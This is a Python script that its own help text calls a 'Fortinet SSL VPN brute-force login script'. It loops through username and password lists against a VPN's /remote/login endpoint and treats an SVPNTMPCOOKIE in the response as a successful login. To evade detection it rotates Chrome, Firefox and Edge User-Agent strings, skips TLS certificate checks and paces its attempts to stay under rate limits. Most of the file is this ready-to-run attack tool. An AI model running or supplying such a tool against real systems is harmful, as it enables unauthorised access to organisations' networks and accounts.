import requests
import time
import argparse
import logging
import random
from urllib.parse import urlparse, urlunparse
from urllib3.exceptions import InsecureRequestWarning

# Suppress SSL warnings but log them
logging.captureWarnings(True)
logger = logging.getLogger('py.warnings')
handler = logging.StreamHandler()
logger.addHandler(handler)

# Configuration
DELAY = 1  # Seconds between attempts
OUTPUT_FILE = "login_attempts.log"
DEFAULT_PATH = "/remote/login"

# Common User-Agent strings for Chrome, Firefox, Edge
USER_AGENTS = [
    # Chrome (Windows, macOS, Linux)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    # Firefox (Windows, macOS, Linux)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.1; rv:109.0) Gecko/20100101 Firefox/114.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/112.0",
    # Edge (Windows, macOS)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.91",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.2151.58"
]

# Function to normalize server name to URL
def normalize_server(server_name):
    # Check if port is specified
    if ":" in server_name:
        host, port = server_name.split(":", 1)
        if not port.isdigit():
            raise ValueError(f"Invalid port in server name: {port}")
    else:
        host = server_name
        port = "443"  # Default to 443 for HTTPS

    # Construct URL
    netloc = f"{host}:{port}"
    parsed = urlparse(f"https://{netloc}{DEFAULT_PATH}")
    return urlunparse(parsed)

# Function to read file contents (usernames or passwords)
def read_file(file_path):
    try:
        with open(file_path, "r") as f:
            lines = [line.strip() for line in f if line.strip()]
        if not lines:
            raise ValueError(f"File {file_path} is empty")
        return lines
    except FileNotFoundError:
        raise FileNotFoundError(f"File {file_path} not found")
    except Exception as e:
        raise Exception(f"Error reading {file_path}: {str(e)}")

# Function to log attempts (to file and console)
def log_attempt(username, password, status, message):
    log_message = f"[{time.ctime()}] Username: {username}, Password: {password}, Status: {status}, Message: {message}"
    print(log_message)  # Log to console
    with open(OUTPUT_FILE, "a") as f:
        f.write(log_message + "\n")  # Log to file

# Function to attempt login
def try_login(target_url, username, password):
    try:
        # Form data for POST request
        data = {
            "username": username,
            "password": password,
            "realm": "",  # Adjust if a specific realm is required
            # "magic": ""  # Uncomment and scrape if needed
        }

        # Select random User-Agent
        headers = {"User-Agent": random.choice(USER_AGENTS)}

        # Send POST request (ignore SSL verification)
        response = requests.post(target_url, data=data, headers=headers, verify=False, timeout=5)

        # Check for HTTP 200 and SVPNTMPCOOKIE
        if response.status_code == 200:
            set_cookie = response.headers.get("Set-Cookie", "")
            if "SVPNTMPCOOKIE=" in set_cookie:
                message = f"Success! SVPNTMPCOOKIE found: {set_cookie}"
                log_attempt(username, password, "SUCCESS", message)
                return True
            else:
                message = "HTTP 200 but no SVPNTMPCOOKIE"
                log_attempt(username, password, "FAIL", message)
        else:
            message = f"HTTP {response.status_code}"
            log_attempt(username, password, "FAIL", message)

    except requests.RequestException as e:
        message = f"Error: {str(e)}"
        log_attempt(username, password, "ERROR", message)

    return False

# Main brute-force function
def main(target_server, user_file, pass_file):
    # Normalize server name to URL
    try:
        target_url = normalize_server(target_server)
    except ValueError as e:
        print(f"Error: {str(e)}")
        return

    print(f"Starting login attempts on {target_url}")
    print(f"Usernames from: {user_file}")
    print(f"Passwords from: {pass_file}")
    print(f"Logging results to {OUTPUT_FILE}")

    # Read usernames and passwords
    try:
        usernames = read_file(user_file)
        passwords = read_file(pass_file)
    except Exception as e:
        print(f"Error: {str(e)}")
        return

    # Brute-force loop
    for username in usernames:
        for password in passwords:
            selected_ua = random.choice(USER_AGENTS)
            log_attempt(username, password, "ATTEMPT", f"Trying login with User-Agent: {selected_ua}")
            if try_login(target_url, username, password):
                print("Stopping on successful login")
                return
            time.sleep(DELAY)  # Delay to avoid rate-limiting

    print("Completed all attempts")

# Parse command-line arguments
def parse_args():
    parser = argparse.ArgumentParser(description="Fortinet SSL VPN brute-force login script with common Chrome, Firefox, Edge User-Agents")
    parser.add_argument(
        "--targetservername",
        required=True,
        help="Target server name or IP, optionally with port (e.g., 192.168.1.1 or server:444)"
    )
    parser.add_argument(
        "--userfile",
        required=True,
        help="Path to file containing usernames (one per line)"
    )
    parser.add_argument(
        "--passfile",
        required=True,
        help="Path to file containing passwords (one per line)"
    )
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_args()
    main(args.targetservername, args.userfile, args.passfile)
